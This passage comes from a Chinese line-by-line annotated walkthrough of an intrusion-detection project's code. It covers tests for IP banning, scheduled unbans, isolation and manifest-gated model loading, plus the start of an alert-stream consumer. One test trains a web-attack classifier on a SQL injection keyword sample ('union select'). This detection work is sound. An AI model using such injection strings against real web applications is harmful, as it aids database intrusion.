| 91 | 函数调用：执行已有函数/方法完成当前步骤。 | `                "https://example.com/hook", 500, "err", {}, _FakeFp()` |
| 92 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 93 | 返回结果：把处理后的值交回调用方。 | `        return _FakeOk()` |
| 94 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 95 | 上下文管理：自动管理资源打开与释放。 | `    with patch("src.response.notifier.urllib.request.urlopen", side_effect=_fake_urlopen):` |
| 96 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        out = notifier.notify_all("s", "b", meta={})` |
| 97 | 断言：验证测试或运行时假设是否成立。 | `    assert any(x.ok for x in out)` |
| 98 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 99 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 100 | 函数定义：声明 `test_high_ban_schedules_unblock_and_tick_writes_unban` 的输入、处理逻辑和返回结果。 | `def test_high_ban_schedules_unblock_and_tick_writes_unban(monkeypatch):` |
| 101 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.delenv("DATABASE_URL", raising=False)` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = SecurityResponder(dry_run=True)` |
| 103 | 函数调用：执行已有函数/方法完成当前步骤。 | `    r._ban_ip("192.0.2.44", duration=timedelta(seconds=1))` |
| 104 | 断言：验证测试或运行时假设是否成立。 | `    assert r.is_banned("192.0.2.44")` |
| 105 | 断言：验证测试或运行时假设是否成立。 | `    assert r.scheduler._mem_tasks, "expected scheduled_unblock task"  # noqa: SLF001` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    past = datetime.now(timezone.utc) - timedelta(seconds=1)` |
| 107 | 循环：逐个处理集合或迭代器中的元素。 | `    for i, t in enumerate(r.scheduler._mem_tasks):  # noqa: SLF001` |
| 108 | 条件判断：满足条件时进入对应分支。 | `        if t.task_type == "scheduled_unblock":` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            r.scheduler._mem_tasks[i] = dataclasses.replace(t, run_at=past)` |
| 110 | 跳出循环：提前结束当前循环。 | `            break` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    n = r.scheduler.tick(r, now=datetime.now(timezone.utc))` |
| 112 | 断言：验证测试或运行时假设是否成立。 | `    assert n >= 1` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    un = [x for x in r.response_actions if x.get("action") == "unban_ip"]` |
| 114 | 断言：验证测试或运行时假设是否成立。 | `    assert un, "unban should be recorded"` |
| 115 | 断言：验证测试或运行时假设是否成立。 | `    assert un[-1].get("status") == "applied"` |
| 116 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 117 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 118 | 函数定义：声明 `test_critical_null_isolation_creates_manual_pending` 的输入、处理逻辑和返回结果。 | `def test_critical_null_isolation_creates_manual_pending(monkeypatch):` |
| 119 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.delenv("DATABASE_URL", raising=False)` |
| 120 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = SecurityResponder(` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dry_run=True,` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        isolation=NullHostIsolationProvider(),` |
| 123 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    res = DetectionResult(` |
| 125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        threat_type="x",` |
| 126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        threat_level="critical",` |
| 127 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        confidence=1.0,` |
| 128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        details="t",` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        source_ip="192.0.2.77",` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        raw_data={},` |
| 131 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 132 | 函数调用：执行已有函数/方法完成当前步骤。 | `    r.respond(res)` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    rows = [x for x in r.response_actions if x.get("action") == "isolation_manual_pending"]` |
| 134 | 断言：验证测试或运行时假设是否成立。 | `    assert rows` |
| 135 | 断言：验证测试或运行时假设是否成立。 | `    assert rows[-1].get("status") == "pending"` |
| 136 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 137 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 138 | 函数定义：声明 `test_response_action_and_unban_persisted_sqlite` 的输入、处理逻辑和返回结果。 | `def test_response_action_and_unban_persisted_sqlite(monkeypatch, tmp_path):` |
| 139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    db_file = tmp_path / "r4.db"` |
| 140 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("DATABASE_URL", f"sqlite:///{db_file.as_posix()}")` |
| 141 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("SECRET_KEY", "test-secret-key-which-is-at-least-32b")` |
| 142 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `    import web.models  # noqa: F401` |
| 143 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 144 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = build_persistence_app(f"sqlite:///{db_file.as_posix()}")` |
| 145 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 146 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.database import db` |
| 147 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 148 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.create_all()` |
| 149 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 150 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    persist = FlaskSqlalchemyResponsePersistence(app)` |
| 151 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    aid = uuid.uuid4().hex` |
| 152 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 153 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.database import db` |
| 154 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.models import Alert` |
| 155 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 156 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.add(` |
| 157 | 函数调用：执行已有函数/方法完成当前步骤。 | `            Alert(` |
| 158 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                id=aid,` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                timestamp=datetime.now(timezone.utc),` |
| 160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                source_ip="192.0.2.88",` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                threat_type="t",` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                level="high",` |
| 163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                status="open",` |
| 164 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 165 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 166 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 167 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = SecurityResponder(` |
| 169 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dry_run=True,` |
| 170 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        persistence=persist,` |
| 171 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert_id_from_result=lambda res: aid,` |
| 172 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 173 | 函数调用：执行已有函数/方法完成当前步骤。 | `    r._ban_ip("192.0.2.88", duration=timedelta(seconds=1))` |
| 174 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    past = datetime.now(timezone.utc) + timedelta(seconds=2)` |
| 175 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 176 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.database import db` |
| 177 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.models import ResponseScheduleTask` |
| 178 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 179 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row = (` |
| 180 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.query(ResponseScheduleTask)` |
| 181 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .order_by(ResponseScheduleTask.id.desc())` |
| 182 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .first()` |
| 183 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 184 | 断言：验证测试或运行时假设是否成立。 | `        assert row is not None` |
| 185 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row.run_at = past - timedelta(seconds=3)` |
| 186 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 187 | 函数调用：执行已有函数/方法完成当前步骤。 | `    r.scheduler.tick(r, now=past)` |
| 188 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 189 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 190 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.models import ResponseAction` |
| 191 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 192 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rows = (` |
| 193 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ResponseAction.query.filter(ResponseAction.alert_id == aid)` |
| 194 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .order_by(ResponseAction.id.asc())` |
| 195 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .all()` |
| 196 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 197 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        types = [x.action_type for x in rows]` |
| 198 | 断言：验证测试或运行时假设是否成立。 | `        assert "ban_ip" in types` |
| 199 | 断言：验证测试或运行时假设是否成立。 | `        assert "unban_ip" in types` |

## `tests/test_schema_manifest.py`

- 类型：测试
- 行数：168

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""R3: schema 契约与 model_manifest 校验。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 5 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 6 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 7 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import joblib` |
| 8 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import pytest` |
| 9 | 导入对象：从指定模块引入类、函数或常量。 | `from sklearn.ensemble import RandomForestClassifier` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir))` |
| 12 | 条件判断：满足条件时进入对应分支。 | `if PROJECT_ROOT not in sys.path:` |
| 13 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, PROJECT_ROOT)` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.feature_schemas import (  # noqa: E402` |
| 16 | 代码语句：参与当前文件的业务流程或数据处理。 | `    production_tabular_keys_present,` |
| 17 | 代码语句：参与当前文件的业务流程或数据处理。 | `    validate_payload_against_schema,` |
| 18 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 19 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.manifest import ManifestLoadError  # noqa: E402` |
| 20 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.nsl_kdd_adapter import NSL_KDD_FEATURE_COLUMNS, NSLKDDAdapter  # noqa: E402` |
| 21 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.persist import write_model_manifest  # noqa: E402` |
| 22 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.ddos_detector import DDoSDetector  # noqa: E402` |
| 23 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.web_detector import WebAttackDetector  # noqa: E402` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 26 | 函数定义：声明 `test_schema_required_field_missing_fails` 的输入、处理逻辑和返回结果。 | `def test_schema_required_field_missing_fails():` |
| 27 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ok, errs = validate_payload_against_schema(` |
| 28 | 代码语句：参与当前文件的业务流程或数据处理。 | `        "network_flow_v1",` |
| 29 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        {"protocol": "TCP", "flow_pkt_count": 1, "flow_byte_count": 100},` |
| 30 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 31 | 断言：验证测试或运行时假设是否成立。 | `    assert ok is False` |
| 32 | 断言：验证测试或运行时假设是否成立。 | `    assert any("src_ip" in e for e in errs)` |
| 33 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 34 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 35 | 函数定义：声明 `test_feature_column_order_matches_inference_vector` 的输入、处理逻辑和返回结果。 | `def test_feature_column_order_matches_inference_vector():` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    flow = {` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "src_ip": "10.0.0.1",` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "protocol": "TCP",` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "flow_pkt_count": 10,` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "flow_byte_count": 500,` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "flow_duration": 1.2,` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "window_unique_dst_port": 3,` |
| 43 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 44 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    cols = ["duration", "count", "srv_count"]  # 子集顺序即推理行向量顺序` |
| 45 | 函数调用：执行已有函数/方法完成当前步骤。 | `    vec, _audit = NSLKDDAdapter.build_vector_in_order(flow, cols)` |
| 46 | 断言：验证测试或运行时假设是否成立。 | `    assert vec == pytest.approx([1.2, 10.0, 3.0])` |
| 47 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 48 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 49 | 函数定义：声明 `test_production_tabular_missing_key` 的输入、处理逻辑和返回结果。 | `def test_production_tabular_missing_key():` |
| 50 | 函数调用：执行已有函数/方法完成当前步骤。 | `    ok, miss = production_tabular_keys_present(` |
| 51 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ["pkt_len_mean", "flow_byte_count"],` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        {"pkt_len_mean": 1.0},` |
| 53 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 54 | 断言：验证测试或运行时假设是否成立。 | `    assert ok is False` |
| 55 | 断言：验证测试或运行时假设是否成立。 | `    assert "flow_byte_count" in miss` |
| 56 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 函数定义：声明 `test_manifest_missing_refuses_ddos_load` 的输入、处理逻辑和返回结果。 | `def test_manifest_missing_refuses_ddos_load(tmp_path):` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    pkl = tmp_path / "m.pkl"` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    X = [[0.0] * 41]` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    y = ["normal"]` |
| 62 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    clf = RandomForestClassifier(n_estimators=1, random_state=0)` |
| 63 | 函数调用：执行已有函数/方法完成当前步骤。 | `    clf.fit(X, y)` |
| 64 | 函数调用：执行已有函数/方法完成当前步骤。 | `    joblib.dump(clf, pkl)` |
| 65 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    det = DDoSDetector()` |
| 66 | 上下文管理：自动管理资源打开与释放。 | `    with pytest.raises(ManifestLoadError):` |
| 67 | 函数调用：执行已有函数/方法完成当前步骤。 | `        det.load_model(str(pkl))` |
| 68 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 69 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 70 | 函数定义：声明 `test_manifest_prototype_nsl_kdd_loads_and_detect_audit` 的输入、处理逻辑和返回结果。 | `def test_manifest_prototype_nsl_kdd_loads_and_detect_audit(tmp_path):` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    pkl = tmp_path / "m.pkl"` |
| 72 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    X = [[0.0] * 41]` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    y = ["normal"]` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    clf = RandomForestClassifier(n_estimators=1, random_state=0)` |
| 75 | 函数调用：执行已有函数/方法完成当前步骤。 | `    clf.fit(X, y)` |
| 76 | 函数调用：执行已有函数/方法完成当前步骤。 | `    joblib.dump(clf, pkl)` |
| 77 | 函数调用：执行已有函数/方法完成当前步骤。 | `    write_model_manifest(` |
| 78 | 函数调用：执行已有函数/方法完成当前步骤。 | `        str(pkl),` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        model_name="t",` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        version="1",` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        schema_name="network_flow_v1",` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        schema_version="1",` |
| 83 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        feature_columns=list(NSL_KDD_FEATURE_COLUMNS),` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        training_dataset="NSL-KDD",` |
| 85 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        metrics={"accuracy": 0.99},` |
| 86 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        artifact_files={"model": "m.pkl"},` |
| 87 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        trust_tier="prototype_nsl_kdd",` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        adapter="nsl_kdd_v1",` |
| 89 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    det = DDoSDetector()` |
| 91 | 函数调用：执行已有函数/方法完成当前步骤。 | `    det.load_model(str(pkl))` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    feats = {` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "src_ip": "1.1.1.1",` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "protocol": "TCP",` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "flow_pkt_count": 5,` |
| 96 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "flow_byte_count": 1200,` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "flow_duration": 0.5,` |
| 98 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "window_unique_dst_port": 2,` |
| 99 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = det.detect(feats)` |
| 101 | 断言：验证测试或运行时假设是否成立。 | `    assert r is not None` |
| 102 | 断言：验证测试或运行时假设是否成立。 | `    assert r.threat_type == "normal"` |
| 103 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 104 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 105 | 函数定义：声明 `test_manifest_schema_production_conflict` 的输入、处理逻辑和返回结果。 | `def test_manifest_schema_production_conflict(tmp_path):` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    pkl = tmp_path / "m.pkl"` |
| 107 | 函数调用：执行已有函数/方法完成当前步骤。 | `    pkl.write_bytes(b"0")` |
| 108 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    data = {` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "model_name": "x",` |
| 110 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "version": "1",` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "schema_name": "network_flow_v1",` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "schema_version": "1",` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "feature_columns": list(NSL_KDD_FEATURE_COLUMNS),` |
| 114 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "training_dataset": "NSL-KDD",` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "metrics": {},` |
| 116 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "created_at": "2026-01-01T00:00:00Z",` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "artifact_files": {"model": "m.pkl"},` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "trust_tier": "production",` |
| 119 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 120 | 上下文管理：自动管理资源打开与释放。 | `    with pytest.raises(ManifestLoadError):` |
| 121 | 导入对象：从指定模块引入类、函数或常量。 | `        from src.schema.manifest import validate_manifest_dict` |
| 122 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 123 | 函数调用：执行已有函数/方法完成当前步骤。 | `        validate_manifest_dict(` |
| 124 | 函数调用：执行已有函数/方法完成当前步骤。 | `            data, model_path=str(pkl), manifest_path=str(tmp_path / "x.json")` |
| 125 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 126 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 127 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 128 | 函数定义：声明 `test_web_ml_requires_manifest` 的输入、处理逻辑和返回结果。 | `def test_web_ml_requires_manifest(tmp_path):` |
| 129 | 导入对象：从指定模块引入类、函数或常量。 | `    from sklearn.feature_extraction.text import TfidfVectorizer  # noqa: WPS433` |
| 130 | 导入对象：从指定模块引入类、函数或常量。 | `    from sklearn.naive_bayes import MultinomialNB  # noqa: WPS433` |
| 131 | 导入对象：从指定模块引入类、函数或常量。 | `    from sklearn.pipeline import Pipeline  # noqa: WPS433` |
| 132 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    pipe = Pipeline(` |
| 134 | 代码语句：参与当前文件的业务流程或数据处理。 | `        [` |
| 135 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ("tfidf", TfidfVectorizer(max_features=20)),` |
| 136 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ("nb", MultinomialNB()),` |
| 137 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ]` |
| 138 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 139 | 函数调用：执行已有函数/方法完成当前步骤。 | `    pipe.fit(["hello normal", "union select"], ["normal", "sql_injection"])` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    pkl = tmp_path / "web.pkl"` |
| 141 | 函数调用：执行已有函数/方法完成当前步骤。 | `    joblib.dump(pipe, pkl)` |
| 142 | 函数调用：执行已有函数/方法完成当前步骤。 | `    write_model_manifest(` |
| 143 | 函数调用：执行已有函数/方法完成当前步骤。 | `        str(pkl),` |
| 144 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        model_name="web_attack_nb_v1",` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        version="1",` |
| 146 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        schema_name="web_request_v1",` |
| 147 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        schema_version="1",` |
| 148 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        feature_columns=["decoded_url"],` |
| 149 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        training_dataset="builtin",` |
| 150 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        metrics={"f1": 0.9},` |
| 151 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        artifact_files={"model": "web.pkl"},` |
| 152 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        trust_tier="production",` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        model_input_mode="text_sklearn_pipeline",` |
| 154 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 155 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    det = WebAttackDetector()` |
| 156 | 函数调用：执行已有函数/方法完成当前步骤。 | `    det.load_model(str(pkl))` |
| 157 | 注释：解释下面或当前这段代码的设计意图。 | `    # 规则未命中时走 ML； benign URL 避免规则抢先` |
| 158 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = det.detect(` |
| 159 | 代码语句：参与当前文件的业务流程或数据处理。 | `        {` |
| 160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "src_ip": "10.0.0.5",` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "url_raw": "/api/health?ok=1",` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "http_method": "GET",` |
| 163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "status_code": 200,` |
| 164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "decoded_url": "/api/health?ok=1",` |
| 165 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 166 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 167 | 断言：验证测试或运行时假设是否成立。 | `    assert r is not None` |
| 168 | 断言：验证测试或运行时假设是否成立。 | `    assert r.source_ip == "10.0.0.5"` |

## `web/__init__.py`

- 类型：Web 后端支撑
- 行数：6

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""Web 可视化与交互层（Phase 7）。` |
| 2 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3 | 代码语句：参与当前文件的业务流程或数据处理。 | `视觉设计遵循 AI-Security-Guardian-DESIGN.md；` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `实施约束遵循 AI-Security-Guardian-Cursor-Phase7-Frontend-Prompt.md；` |
| 5 | 代码语句：参与当前文件的业务流程或数据处理。 | `安全与通信基线（JWT/CORS/Limiter/SocketIO）来自开发实操指南 Phase 7。` |
| 6 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |

## `web/alert_stream_consumer.py`

- 类型：Web 后端支撑
- 行数：186

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""消费 \`\`guardian:alerts\`\` Redis Stream：规范化 → 入库 → ack → Socket.IO / 内存缓存同步。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 5 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import threading` |
| 7 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 8 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Callable, Dict, List, Optional, Tuple` |
